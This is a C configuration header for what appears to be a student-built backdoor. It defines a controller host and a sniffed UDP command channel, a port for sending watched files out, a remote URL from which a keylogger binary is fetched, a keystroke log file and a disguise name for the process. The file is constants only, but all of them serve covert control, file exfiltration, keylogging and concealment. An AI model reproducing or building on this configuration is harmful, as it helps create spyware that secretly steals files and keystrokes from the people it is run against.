#ifndef CONFIG_H
#define CONFIG_H

#define MAX_DATA_SIZE 65535
#define MAX_BUFFER_SIZE 256
#define ZIP_NAME "enc.zip"

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#define NIC_NAME "wlp4s0"
#define LHOST "192.168.0.112"
#define CMD_CHANNEL_PORT 383
#define FILE_EXFILT_PORT 8080
#define HEADER_KEY "noob"
#define PASSWORD "password"

const char *watch_list[][2] = {
{"/home/dwong/Desktop/MISC/Test","test.txt"},
{"/home/dwong/Desktop/MISC/Test2","test2.txt"},
};

#define SNIFFER_FILTER "src host " LHOST " and udp dst port " STR(CMD_CHANNEL_PORT)
#define EXFILT_FUNC_NAME "exfilt-file "

#define KEYLOGGER_URL "192.168.0.103:8000/8505/final_proj/keylogger/"
#define KEYLOGGER_INSTALL_DIR "./"
#define KEYLOGGER_NAME "keylogger.elf"
#define SAVE_AT "./keystroke.txt"

#define MASK_NAME "hello"

#endif
